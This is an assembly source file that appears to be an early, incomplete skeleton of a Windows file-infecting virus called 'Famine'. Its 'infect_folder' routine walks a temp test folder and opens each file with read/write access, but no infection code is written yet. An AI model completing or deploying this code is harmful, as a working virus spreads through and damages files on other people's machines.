;-----------------------------------
;Descr  : My First 64-bit MASM program
;ml64 prog.asm /c
;golink /console /entry main prog.obj msvcrt.dll, or
;gcc -m64 prog.obj -o prog.exe (main/ret). This needs 64-bit GCC.
;-----------------------------------

includelib libcmt.lib
includelib libvcruntime.lib
includelib kernel32.lib

extrn puts:proc
extrn exit:proc
extrn _open:proc
extrn printf:proc
extrn FindFirstFileA:proc
extrn FindNextFileA:proc
extrn memset:proc
extrn strncat:proc
extrn strncpy:proc
extrn ReadFile:proc
extrn CreateFileA:proc
extrn print_last_error:proc

.code
label_debut:
db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h

hello db 'Hello 64-bit world!',0ah,0
print_decimal db 'open : %d',0ah,0
print_ptr db 'ptr : %p',0ah,0
TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h

; rbp
; 202 - 206		: number_of_bytes_read
; 200 - 202		:  Buffer
; 64 - 200		: ofstruct
; 32 - 64		: params
; 00 - 32		: shadow
; rsp

open_file proc ; char *file_path - return fd or 0
	push rbp
	mov rbp, rsp
	sub rsp, 320
	
	xor rax, rax

	push rcx
	push 0
	call puts
	pop rcx
	pop rcx

	mov rdx, 0C0000000h ; Desired Access
	mov r8, 0 ; Share permission
	mov r9, 0 ; NULL
	mov rax, 3
	mov [rsp + 32], rax ; Open only if exists
	mov rax, 80h
	mov [rsp + 36], rax ; flag normal
	mov rax, 0
	mov [rsp + 40], rax ; no attribute template
	call CreateFileA

	cmp rax, -1
	je ret_ret

	mov r12, rax

	mov rcx, r12
	lea rdx, [rsp + 200]
	mov r8, 2
	lea r9, [rsp + 202]
	push 0
	push 0
	call ReadFile
	add rsp, 16

ret_ret:
	call print_last_error
	mov rax, r12
	mov rsp, rbp
	pop rbp
	ret
open_file endp

; rbp
; 400-528	: path + file name
; 40-400	: structure WIN32_FIND_DATA dirent
; 32-40		: folder_name
; 00-32		: shadow
; rsp

infect_folder proc ; parametres : char *folder_name
		push rbp
		mov rbp, rsp
		sub	rsp, 528

		mov [rsp + 32], rcx
		call puts

		mov rcx, [rsp + 32]
		lea rdx, [rsp + 40]
		call FindFirstFileA

		mov rsi, rax
loop_start:
		mov rcx, rsi
		lea rdx, [rsp + 40]
		call FindNextFileA

		cmp rax, 0
		je loop_end

		lea rcx, [rsp + 84]
		call puts

		lea rcx, [rsp + 400]
		lea rdx, TMP_1_NAME
		mov r8, 128
		call strncpy

		lea rcx, [rsp + 400]
		lea rdx, [rsp + 84]
		mov r8, 128
		call strncat

		lea rcx, [rsp + 400]
		call open_file

		lea rcx, [rsp + 400]
		call puts

		jmp loop_start
loop_end:
		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
infect_folder endp


; rbp
; 40-48 : alignment
; 32-40 : av[0]
; 00-32 : shadow space
; rsp 

main proc
		push rbp
		mov rbp, rsp
		sub	rsp, 48

		mov rcx, [rdx]

		mov [rsp + 32], rcx

		mov rcx, label_debut
		call puts

		mov rcx, [rsp + 32]
		mov rdx, 8000h
		mov	r8, 0
		call _open

		lea rcx, print_decimal
		mov rdx, rax
		call printf

		lea rcx, print_ptr
		mov rdx, label_debut
		call printf

		lea rcx, TMP_1
		call infect_folder

		mov rdx, label_fin
		mov rcx, label_debut
		sub rdx, rcx
		lea rcx, print_ptr
		call printf

		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
main endp

label_fin:
end